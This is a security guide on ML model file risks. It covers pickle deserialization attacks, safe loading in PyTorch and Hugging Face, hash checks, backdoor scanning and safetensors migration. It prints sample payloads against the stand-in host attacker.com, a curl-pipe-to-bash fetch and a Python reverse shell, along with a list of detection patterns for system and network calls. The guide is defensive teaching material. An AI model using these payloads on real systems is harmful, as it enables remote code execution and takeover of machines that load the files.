# Model File Security Guide

## Contents
- Model Format Risk Levels
- Pickle Deserialization Attacks
- Safe Model Loading Patterns
- Model Source Verification
- Backdoor Detection
- Safetensors Migration

---

## Model Format Risk Levels

### Risk Matrix

| Format | Extension | Risk Level | Code Execution | Recommended |
|--------|-----------|------------|----------------|-------------|
| PyTorch (pickle) | `.pt`, `.pth` | CRITICAL | Yes | No |
| Python Pickle | `.pkl`, `.pickle` | CRITICAL | Yes | No |
| Joblib | `.joblib` | CRITICAL | Yes (pickle) | No |
| Keras HDF5 | `.h5`, `.keras` | HIGH | Lambda layers | Caution |
| TensorFlow SavedModel | `saved_model.pb` | MEDIUM | Custom ops | Caution |
| ONNX | `.onnx` | LOW | Limited | Yes |
| Safetensors | `.safetensors` | SAFE | No | Yes ✅ |
| GGUF | `.gguf` | SAFE | No | Yes ✅ |

---

## Pickle Deserialization Attacks

### How It Works

```python
# Pickle allows arbitrary code execution via __reduce__
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))

# Attacker creates malicious "model" file
with open("model.pkl", "wb") as f:
    pickle.dump(Malicious(), f)

# Victim loads the "model" - CODE EXECUTES!
model = pickle.load(open("model.pkl", "rb"))  # RCE happens here!
```

### Attack Vectors in ML

```python
# 1. PyTorch models (most common)
model = torch.load("malicious_model.pt")  # Executes pickle payload

# 2. Joblib models (scikit-learn)
model = joblib.load("malicious_model.joblib")  # Uses pickle

# 3. Direct pickle
data = pickle.load(open("embeddings.pkl", "rb"))  # Any pickle file

# 4. NumPy with allow_pickle
data = np.load("data.npy", allow_pickle=True)  # If contains objects
```

### Real-World Exploits

**Hugging Face Model Poisoning (2023-2024)**:
- Malicious models uploaded to Hugging Face Hub
- `__reduce__` payloads hidden in model weights
- Executed when users called `from_pretrained()`

**Example Payload**:
```python
class BackdoorModel:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, ([
            "python", "-c",
            "import socket,subprocess,os;"
            "s=socket.socket();"
            "s.connect(('attacker.com',4444));"
            "os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);"
            "os.dup2(s.fileno(),2);"
            "subprocess.call(['/bin/sh','-i'])"
        ],))
```

---

## Safe Model Loading Patterns

### PyTorch

```python
# ❌ UNSAFE - Never do this
model = torch.load("model.pt")

# ✅ SAFE - Use weights_only (Python 3.12+ / PyTorch 2.4+)
model = torch.load("model.pt", weights_only=True)

# ✅ SAFER - Use safetensors
from safetensors.torch import load_file
state_dict = load_file("model.safetensors")
model.load_state_dict(state_dict)

# ✅ SAFEST - Load from trusted source with verification
from safetensors.torch import load_model
model = MyModelClass()
load_model(model, "model.safetensors")
```

### Hugging Face Transformers

```python
# ❌ UNSAFE - No verification
model = AutoModel.from_pretrained("unknown/model")

# ❌ UNSAFE - Remote code execution enabled
model = AutoModel.from_pretrained("org/model", trust_remote_code=True)

# ✅ SAFE - Pin revision, disable remote code
model = AutoModel.from_pretrained(
    "meta-llama/Llama-3.1-70B",
    revision="abc123def456789",  # Specific commit hash
    trust_remote_code=False,     # NEVER True for untrusted
    use_safetensors=True,        # Prefer safetensors format
)

# ✅ SAFER - Use allowlist
ALLOWED_MODELS = {
    "openai/whisper-large-v3",
    "meta-llama/Llama-3.1-70B",
    "mistralai/Mistral-7B-v0.1",
}

def safe_load_model(model_id: str):
    if model_id not in ALLOWED_MODELS:
        raise ValueError(f"Model '{model_id}' not in allowlist")
    return AutoModel.from_pretrained(
        model_id,
        trust_remote_code=False,
        use_safetensors=True,
    )
```

### Scikit-learn / Joblib

```python
# ❌ UNSAFE - Never load untrusted joblib files
model = joblib.load("model.joblib")

# ✅ SAFE - Train your own models
from sklearn.ensemble import RandomForestClassifier
model = RandomForestClassifier()
model.fit(X_train, y_train)

# ✅ ALTERNATIVE - Use ONNX for inference
import onnxruntime as ort
session = ort.InferenceSession("model.onnx")
```

---

## Model Source Verification

### Checksum Verification

```python
import hashlib
from pathlib import Path

KNOWN_MODEL_HASHES = {
    "model-v1.safetensors": "sha256:a1b2c3d4e5f6...",
    "tokenizer.json": "sha256:f6e5d4c3b2a1...",
}

def verify_model_hash(file_path: str, expected_hash: str) -> bool:
    """Verify model file integrity."""
    algo, expected = expected_hash.split(":")
    hasher = hashlib.new(algo)

    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            hasher.update(chunk)

    actual = hasher.hexdigest()
    return actual == expected

# Usage
if not verify_model_hash("model.safetensors", KNOWN_MODEL_HASHES["model-v1.safetensors"]):
    raise ValueError("Model file hash mismatch - possible tampering!")
```

### Hugging Face Model Signature Verification

```python
from huggingface_hub import HfApi, model_info

def verify_model_source(model_id: str) -> dict:
    """Verify model authenticity on Hugging Face Hub."""
    api = HfApi()
    info = model_info(model_id)

    verification = {
        "model_id": model_id,
        "author": info.author,
        "downloads": info.downloads,
        "likes": info.likes,
        "tags": info.tags,
        "is_verified_org": info.author in VERIFIED_ORGS,
        "has_model_card": info.card_data is not None,
        "uses_safetensors": any(
            s.rfilename.endswith(".safetensors")
            for s in info.siblings
        ),
    }

    # Risk assessment
    risk_score = 0
    if not verification["is_verified_org"]:
        risk_score += 30
    if info.downloads < 1000:
        risk_score += 20
    if not verification["uses_safetensors"]:
        risk_score += 40
    if not verification["has_model_card"]:
        risk_score += 10

    verification["risk_score"] = risk_score
    verification["risk_level"] = (
        "HIGH" if risk_score >= 50 else
        "MEDIUM" if risk_score >= 30 else
        "LOW"
    )

    return verification

VERIFIED_ORGS = {
    "openai", "meta-llama", "mistralai", "google",
    "microsoft", "facebook", "huggingface", "stabilityai",
}
```

---

## Backdoor Detection

### Static Analysis Patterns

```python
import re
from pathlib import Path

BACKDOOR_PATTERNS = [
    # Network connections
    r"socket\.socket\s*\(",
    r"urllib\.request",
    r"requests\.(get|post)",
    r"http\.client",

    # System commands
    r"os\.system\s*\(",
    r"subprocess\.(run|call|Popen)",
    r"exec\s*\(",
    r"eval\s*\(",

    # File operations
    r"open\s*\([^)]*['\"]w",
    r"shutil\.(copy|move|rmtree)",

    # Pickle-specific
    r"__reduce__",
    r"__reduce_ex__",
    r"__getstate__",
    r"__setstate__",
]

def scan_pickle_file(file_path: str) -> list:
    """Scan pickle file for suspicious patterns."""
    findings = []

    with open(file_path, "rb") as f:
        content = f.read()

    # Check for suspicious strings in binary content
    text_content = content.decode("latin-1", errors="ignore")

    for pattern in BACKDOOR_PATTERNS:
        matches = re.findall(pattern, text_content)
        if matches:
            findings.append({
                "pattern": pattern,
                "count": len(matches),
                "severity": "CRITICAL",
            })

    return findings
```

### Runtime Detection

```python
import sys
import io
from contextlib import redirect_stdout, redirect_stderr

def safe_unpickle_with_monitoring(file_path: str):
    """Load pickle with monitoring for suspicious activity."""
    import pickle

    # Capture any output during unpickling
    stdout_capture = io.StringIO()
    stderr_capture = io.StringIO()

    # Track module imports
    original_import = __builtins__.__import__
    imported_modules = []

    def tracking_import(name, *args, **kwargs):
        imported_modules.append(name)
        return original_import(name, *args, **kwargs)

    try:
        __builtins__.__import__ = tracking_import

        with redirect_stdout(stdout_capture), redirect_stderr(stderr_capture):
            with open(file_path, "rb") as f:
                result = pickle.load(f)

        # Check for suspicious imports
        suspicious = {"os", "subprocess", "socket", "urllib", "requests"}
        found_suspicious = suspicious & set(imported_modules)

        if found_suspicious:
            raise ValueError(
                f"Suspicious modules imported during unpickling: {found_suspicious}"
            )

        return result
    finally:
        __builtins__.__import__ = original_import
```

---

## Safetensors Migration

### Convert PyTorch to Safetensors

```python
from safetensors.torch import save_file
import torch

# Load existing model (in trusted environment only!)
model = torch.load("model.pt", weights_only=True)

# Extract state dict
if hasattr(model, "state_dict"):
    state_dict = model.state_dict()
else:
    state_dict = model  # Assume it's already a state dict

# Convert tensors to CPU and save
cpu_state_dict = {k: v.cpu() for k, v in state_dict.items()}
save_file(cpu_state_dict, "model.safetensors")

print("Model converted to safetensors format!")
```

### Hugging Face CLI Conversion

```bash
# Convert a model to safetensors
huggingface-cli convert --input model.pt --output model.safetensors

# Or use Python
python -c "
from transformers import AutoModel
model = AutoModel.from_pretrained('org/model')
model.save_pretrained('output/', safe_serialization=True)
"
```

### Verification After Conversion

```python
from safetensors.torch import load_file
import torch

# Load both formats
original = torch.load("model.pt", weights_only=True)
converted = load_file("model.safetensors")

# Verify all weights match
for key in original.keys():
    if key not in converted:
        raise ValueError(f"Missing key: {key}")
    if not torch.allclose(original[key], converted[key]):
        raise ValueError(f"Tensor mismatch for key: {key}")

print("✅ Conversion verified - all weights match!")
```

---

## Quick Reference

### File Extension Risk

| See | Think | Do |
|-----|-------|-----|
| `.pt`, `.pth` | CRITICAL | Convert to safetensors |
| `.pkl`, `.pickle` | CRITICAL | Remove or convert |
| `.joblib` | CRITICAL | Retrain with ONNX |
| `.h5` | HIGH | Audit for Lambda layers |
| `.safetensors` | SAFE | Use directly |
| `.onnx` | LOW | Use directly |

### Command Cheat Sheet

```bash
# Find all risky model files
find . -name "*.pt" -o -name "*.pth" -o -name "*.pkl" -o -name "*.joblib"

# Check for unsafe loading patterns
grep -rE "torch\.load|pickle\.load|joblib\.load" --include="*.py" .

# Convert to safetensors (requires safetensors package)
python -c "from safetensors.torch import save_file; import torch; save_file(torch.load('m.pt', weights_only=True), 'm.safetensors')"
```
